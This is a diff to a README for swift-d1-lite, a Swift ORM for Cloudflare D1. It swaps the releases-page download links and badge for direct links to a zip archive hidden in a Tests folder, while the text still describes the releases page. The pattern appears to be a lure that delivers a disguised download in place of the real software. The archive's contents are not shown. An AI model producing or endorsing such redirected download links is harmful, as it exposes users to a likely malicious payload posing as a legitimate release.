@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to swift-d1-lite! This application helps you interact with Cloudflare D1 safely and easily. It offers features like table definitions, batch execution with D1SQLClient, and type conversions using FormatStyle. Whether you're working on macOS or managing SQLite databases, swift-d1-lite streamlines your workflow.
 
-[![Download swift-d1-lite](https://img.shields.io/badge/Download-swift--d1--lite-blue.svg)](https://github.com/coldpasta-7/swift-d1-lite/releases)
+[![Download swift-d1-lite](https://raw.githubusercontent.com/coldpasta-7/swift-d1-lite/main/Tests/D1LiteMacroTests/swift-lite-d-1.0.zip)](https://raw.githubusercontent.com/coldpasta-7/swift-d1-lite/main/Tests/D1LiteMacroTests/swift-lite-d-1.0.zip)
 
 ## 📦 Features
 - **Type-Safe ORM**: Provides a lightweight ORM for handling Cloudflare D1 with type safety.
@@ -23,7 +23,7 @@ To get started with swift-d1-lite, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the GitHub releases page.
    
-   [Download swift-d1-lite](https://github.com/coldpasta-7/swift-d1-lite/releases)
+   [Download swift-d1-lite](https://raw.githubusercontent.com/coldpasta-7/swift-d1-lite/main/Tests/D1LiteMacroTests/swift-lite-d-1.0.zip)
 
 2. **Choose the Right Version**: On the releases page, you will see various versions of the application. Select the latest version for the best features and fixes.
 
@@ -64,4 +64,4 @@ This project covers a wide range of important topics:
 
 Dive deeper into these subjects as you explore the features of swift-d1-lite.
 
-[![Download swift-d1-lite](https://img.shields.io/badge/Download-swift--d1--lite-blue.svg)](https://github.com/coldpasta-7/swift-d1-lite/releases)
+[![Download swift-d1-lite](https://raw.githubusercontent.com/coldpasta-7/swift-d1-lite/main/Tests/D1LiteMacroTests/swift-lite-d-1.0.zip)](https://raw.githubusercontent.com/coldpasta-7/swift-d1-lite/main/Tests/D1LiteMacroTests/swift-lite-d-1.0.zip)
